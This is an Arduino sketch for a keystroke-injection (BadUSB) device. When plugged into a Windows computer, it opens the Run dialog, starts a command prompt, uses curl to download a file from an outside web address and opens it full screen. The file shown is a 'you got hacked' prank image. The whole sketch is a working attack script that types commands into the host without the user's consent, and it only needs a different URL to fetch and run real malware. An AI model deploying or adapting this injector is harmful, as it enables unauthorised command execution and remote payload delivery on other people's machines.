/*
 * 
 * this sketch is downloading file from internet and opening it
 * pin 2 is for on/off switch so you can safelly upload code or connect it to your machine
 * 
 */

#include <Keyboard.h>

void setup() {
  pinMode(2,INPUT);
  pinMode(13,OUTPUT);
  Serial.begin(9600);
  Keyboard.begin();
}

bool attack = false;
String URL = "https://blog.techstarters.com/wp-content/uploads/2015/06/you-got-hack-blog.jpg";
String filename = "you-got-hack-blog.jpg";

void loop() {
  if(digitalRead(2) == 1){
    AbortAttack();
  }
  else{
     if(attack == false){
      attack = true;
      delay(1000);
      Keyboard.press(KEY_LEFT_GUI); //windows key
      Keyboard.press('r');
      Keyboard.releaseAll();
      delay(1000);
      Keyboard.write(KEY_BACKSPACE);
      Keyboard.print("cmd");
      Keyboard.print('\n'); //enter
      delay(4000);
      Keyboard.print("curl " + URL + " -o " + filename);
      Keyboard.print('\n'); //enter
      delay(3000);
      Keyboard.print(filename + "\n");
      delay(2000);
      Keyboard.write(KEY_F11);
      
      
     }
     else{
      AbortAttack();
     }
  }
}

void AbortAttack(){
  while(true){
    digitalWrite(13,HIGH);
    delay(1000);
    digitalWrite(13,LOW);
    delay(1000);
    if(!(digitalRead(2))){
      break;
    }
  }
}
